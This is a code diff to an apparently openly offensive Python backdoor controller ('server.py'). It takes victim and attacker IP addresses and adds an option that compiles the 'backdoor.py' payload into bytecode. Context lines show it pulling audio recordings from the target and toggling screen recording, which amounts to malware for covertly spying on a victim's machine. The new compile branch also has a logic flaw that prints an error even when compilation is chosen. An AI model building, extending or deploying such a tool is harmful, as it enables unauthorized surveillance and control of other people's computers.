@@ -5,6 +5,7 @@ import os
 import socket
 import sys
 import termcolor
+import py_compile
 
 # main veriables
 _author = "Joseph frank"
@@ -16,6 +17,7 @@ ap = argparse.ArgumentParser()
 ap.add_argument("-rh", "--rhost", required=True, help="Victim ip")
 ap.add_argument("-lh", "--lhost", required=True, help="Your local ip")
 ap.add_argument("-p", "--port", required=True, help="Port")
+ap.add_argument("-c", "--compile", required=False, help="Compiler payload file, example: python server.py -c y")
 args = vars(ap.parse_args())
 
 if args['lhost']:
@@ -24,6 +26,25 @@ if args['rhost']:
     RHOST = str(args['rhost'])
 if args['port']:
     PORT = int(args['port'])
+if args['compile']:
+    if str(args['compile']) == 'y':
+        try:
+            py_compile.compile("backdoor.py")
+            print(termcolor.colored("[+] Finished compiling", 'green'))
+            print(termcolor.colored("[+] goto __pycache__ folder", 'green'))
+        except py_compile.PyCompileError:
+            print(termcolor.colored("[+] Error: can not compile :-(",'red'))
+    if str(args['compile']) == 'n':
+        pass
+    else:
+        print(termcolor.colored("[-] Error expected one argument", 'red'))
+        usernput = input(termcolor.colored("Do you want to exit y/n: "))
+        if usernput == 'y':
+            exit()
+        elif usernput == 'n':
+            os.system('clear')
+            pass
+
 
 
 def modify_backdoor():
@@ -138,7 +159,6 @@ def target_reqs():
             os.replace("recorded%d.wav" % count, "recordings/recorded%d.wav" % count)
             count += 1
             print(termcolor.colored('[+] Done recorded file', 'green'))
-        # TODO adding record screen function
 
         elif cmd[:13] == 'screen_record':
             if cmd[14:] == 'on':
